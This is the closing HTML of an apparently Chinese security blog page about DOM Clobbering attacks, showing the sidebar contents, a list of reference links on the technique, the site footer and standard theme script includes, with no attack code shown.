class="nav-text">当我们输入的字符被过滤，不能xss时，但是又能输出标签时，是不是可以考虑DOM Clobbering Attack呢？</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x09"><span class="nav-number">1.9.</span> <span class="nav-text">0x09</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.9.1.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#http-d1iv3-me-2018-04-11-DOM-Clobbering-Attack"><span class="nav-number">1.9.1.1.</span> <span class="nav-text">http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-juejin-im-post-5abb99e9f265da2392366824"><span class="nav-number">1.9.1.2.</span> <span class="nav-text">https://juejin.im/post/5abb99e9f265da2392366824</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-wonderkun-cc-2020-02-15-DOM-20Clobbering-20Attack-E5-AD-A6-E4-B9-A0-E8-AE-B0-E5-BD-95"><span class="nav-number">1.9.1.3.</span> <span class="nav-text">https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-portswigger-net-research-dom-clobbering-strikes-back"><span class="nav-number">1.9.1.4.</span> <span class="nav-text">https://portswigger.net/research/dom-clobbering-strikes-back</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-7346"><span class="nav-number">1.9.1.5.</span> <span class="nav-text">https://xz.aliyun.com/t/7346</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-7329-toc-14"><span class="nav-number">1.9.1.6.</span> <span class="nav-text">https://xz.aliyun.com/t/7329#toc-14</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-medium-com-terjanq-dom-clobbering-techniques-8443547ebe94"><span class="nav-number">1.9.1.7.</span> <span class="nav-text">https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-7343"><span class="nav-number">1.9.1.8.</span> <span class="nav-text">https://xz.aliyun.com/t/7343</span></a></li></ol></li></ol></li></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">176.7k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
